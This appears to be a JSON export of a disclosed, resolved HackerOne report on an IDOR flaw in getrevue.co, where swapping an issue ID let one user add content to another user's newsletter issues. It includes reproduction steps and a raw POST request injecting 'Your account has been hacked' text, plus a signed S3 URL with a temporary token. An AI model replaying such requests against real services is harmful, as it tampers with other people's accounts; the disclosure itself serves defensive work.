@@ -1,0 +1,128 @@
+{
+  "id": 1096560,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk2NTYw",
+  "url": "https://hackerone.com/reports/1096560",
+  "title": "Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-05T17:50:44.685Z",
+  "submitted_at": "2021-02-05T17:50:44.767Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mirhat",
+    "url": "/mirhat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/saghl336vv60dobcjdmomnqntrg0/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-05-26T21:56:54.060Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-04-26T21:56:42.170Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \n\nHi team,\nI discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR\n\n**Description:**\n\nIt's possible to perform a IDOR attacker on `getrevue.co`when adding a image to your issue it's also possible to add descriptions and more to other people's issue\n\n## Steps To Reproduce:\n\n   1. Go to `getrevue.co` and Sign In\n   2. Click on Issues then Click on Add new issue\n   3. Go to the Issue that you created and from the bottom of the page Click on Media\n   4. Turn on the Intercept and Upload image\n   5. On the request change the ID to your other account's issue ID\n\nRequest:\n\n```\nPOST /app/items HTTP/1.1\nHost: www.getrevue.co\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://www.getrevue.co/app/issues/current\nX-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 519\nOrigin: https://www.getrevue.co\nConnection: close\nCookie: [YOUR_COOKIE]\n\n{\"item_type\":\"image\",\"issue\":347976,\"id\":null,\"title\":\"Your account has been hacked\",\"url\":\"\",\"description\":\"Your account has been hacked\",\"author\":\"Your account has been hacked\",\"publication\":\"Your account has been hacked\",\"section\":\"Your account has been hacked\",\"image\":\"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png\",\"image_file_name\":\"\",\"created_at\":\"\",\"tweet_handle\":\"\",\"tweet_profile_image\":\"\",\"tweet_description\":\"\",\"tweet_lang\":\"\"}\n```\r\n\nPOC video:\n\n{F1185366}\n\n## Impact\n\nAbility to add arbitrary images/descriptions/titles to other people's issues\nIt's possible to hijack other people's issues",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1185366,
+      "file_name": "Ekran_Kayd__2021-02-05_20.39.45.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jdndp8mwky68xxek2td8n7047j8m?response-content-disposition=attachment%3B%20filename%3D%22Ekran_Kayd__2021-02-05_20.39.45.mov%22%3B%20filename%2A%3DUTF-8%27%27Ekran_Kayd__2021-02-05_20.39.45.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMN3TFTB%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T230739Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCJ1XoJ2rvDUT%2FvQwDNKTsq1Xz%2FdwtAeQzv02Xu%2Bvu5ywIhAMItGtSE3kESm5svXrkmpOUZIoQXb2dukK0z%2FECso8CPKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igwff4mY8daR2nqlCgsqjwVLvgbC2HWlCoH81sI7Vvyk3yWvTwS4bv21vpbCrZjDd8TgvTNH4CR6kFYHKrg%2FJ2n01%2FjoLxtNauoZgbFsgGNbrxVjyFu5LyRSuR63Zm1kVQ055VtsctuDWr8MBCkY6wBKpFNjRtwOV647gs2HEcIQC4jlvyEUFYpXSPk1HtWqGehxH0MTR21zU%2FntW9GuVrLgf%2BOxPO%2BVJscGmTkw24QJBDXe7p76resq807H8qbGCSeGtHDl8UfD2KZ7hZRByeAj3gMSX8M1j12nG1ckBrnlLaGqrzGa2K8V5h4veerwsMPHpYXTb%2B%2FeXu2mRivttjUb1PrqwwX23AjdMeRPc3D4rmBSiBfMYcSO2WNcxn6VR4sbQdCPFqiHhPPZOFBTQYgtP04Uglz0CKIQst6%2FHCFM1Vf9xreWuUGXvMdRxWIaCgAlB6jXhzna938WvVr6R5wL1zeNGLvfHcaBNI%2B%2FPXgqyl35DB7s9yK1HJIb4X7jQJZ6TmePhB85QCvuoIQDrEfP2Kb%2BzL4MtoztUlmDYu8JOLH%2B4rwNYwkL2hMbcUir4M5LkPRNctJA5d6XoZ%2FWLX5%2FfgMWbBgd6qO%2BMK1Tg3Rqw649Z92BDKJ%2BaM7jcHP9xA7n3JK8dkyWJsGfZduBN%2Fv7O9cDJCL6%2BHQDe6x3MVE8%2FIrBUUbown%2BQwFaRqVIxNqUlTGKsKcmluhGAGxD7A4S8MeDFDKSqAIBn%2FjZ%2FSJ0XsOmUo9ntNthmOr8Oo7dYAzisaeg5XyDqOpa7P2dZNuUoMTJOjg5ufOteqAq5HgvJ3VPyw0FoQ4Ve1Y1iQCi2jpkoyf5GqMRNe4XJndxXbOfc2ABf6CsWAA3LJzfbyClEZhCKWtovDeVdN8xa8x93MKDC4swGOrABMIag7bHRmk0YR3QrHBqOrwYZ2n7py6iPbYZ9%2BTicKKjXO%2BdTTOOdbo%2FCcQASZs7sI%2B2ZrjBdY4nd9waDJgK%2FVh0Epv5aENQf57rplZq%2BfUjlcVd1vZJ1%2BCEmgqxxcQ0eLwM7zf51deHj1eVktSNGVP%2FPJAAr5miE9vtz9jRiN%2BWwO0yrDOnM4uykApBX6SopTj%2FEA1iZ%2FXj9DRIce4XGkiDEO%2BqRmQs5iMCkfQFeeg0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=30f7d29840de81618a905d4ab04789d75b280386d25f148e162b1b9641349703",
+      "file_size": 85339582,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-05-26T21:56:42.255Z",
+  "allow_singular_disclosure_after": -149562656.7486303,
+  "singular_disclosure_allowed": true,
+  "vote_count": 62,
+  "voters": [
+    "taha",
+    "aniiisolanki",
+    "arist0phanes",
+    "bombon",
+    "osman1337",
+    "fdeleite",
+    "alp",
+    "mr-k0anti",
+    "shreyaschavhan",
+    "ali",
+    "and 52 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
